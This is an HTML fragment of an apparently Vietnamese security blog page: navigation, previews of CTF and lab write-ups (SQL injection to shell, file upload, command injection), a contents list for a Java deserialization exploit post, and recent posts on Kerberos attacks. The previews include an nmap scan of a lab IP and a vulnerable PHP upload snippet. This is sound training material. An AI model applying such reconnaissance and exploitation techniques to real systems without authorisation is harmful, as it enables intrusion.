class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Pentester Lab From Sql Injection to Shell</div></div><div class="info-2"><div class="info-item-1">Pentester Lab From Sql Injection to ShellFingerprinting Sử dụng nmap với cú pháp: 1sudo nmap -sV 192.168.179.132 -T4  Kết quả trả về cho thấy đang có 2 port đang được mở đó là port 22 và 80 như ta đã biết port 22 là SSH còn 80 là Apache httpd thì có nghĩa là nó đang host 1 cái web nào đó.  Tiến hành curl đến xem thử có tồn tại không và để lấy được source code của web được host ở đây nó đưa cho ta thông tin về server và web được code bằng PHP/5.3.3-7+squeeze14.  Truy cập GUI để cho dễ nhìn và ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-26-WebSecFr-Level1/" title="WebSec.fr level 1 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr level 1 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr level 1 CTF challengeOverview Giao diện chức năng của level này ta có thể thấy nó là một web app có chức năng hiển thị username bằng cách nhập vào userID nên bước đầu ta có thể nghi ngờ nó dính Sql Injection. Phân tích source code123456789101112131415161718192021222324252627282930313233&lt;?phpsession_start ();ini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);include &#x27;anti_csrf.php&#x27;;init_token ();class LevelOne &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/" title="Spring Time CTF challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Spring Time CTF challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">Spring Time CTF challenge WriteUp Web App được chia làm 2 services khác nhau bao gồm:  gateman : port 8080 newsman : port 8082  Phân tích từng chức năng từng service Gateman   Nó được chạy bằng port 8080 bên cạnh đó nó còn gọi cloud cùng với đó là expose include ra các chức năng như health , info , gateway. Vậy nên có thể biết được đây là service Spring Cloud với chức năng routing đến các routes.  Newsman  Ta sẽ đi thẳng vào luôn đầu tiên là NewsController.class:  1234567891011121314151617181...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">A blog about cybersecurity, hacking, pentesting, red teaming and more.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Deserialize-CBJS-Lab"><span class="toc-number">1.</span> <span class="toc-text">Java Deserialize CBJS Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Giai-thich-chi-tiet-ve-lo-hong-Deserialization"><span class="toc-number">1.1.</span> <span class="toc-text">Giải thích chi tiết về lỗ hổng Deserialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-and-POC"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit and POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1"><span class="toc-number">1.3.</span> <span class="toc-text">Level 1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2"><span class="toc-number">1.4.</span> <span class="toc-text">Level 2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-3"><span class="toc-number">1.5.</span> <span class="toc-text">Level 3:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4"><span class="toc-number">1.6.</span> <span class="toc-text">Level 4:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst">Ysoserial Commons Collections 5 Analyst</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps">PortSwigger CSRF Challenge WriteUps</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>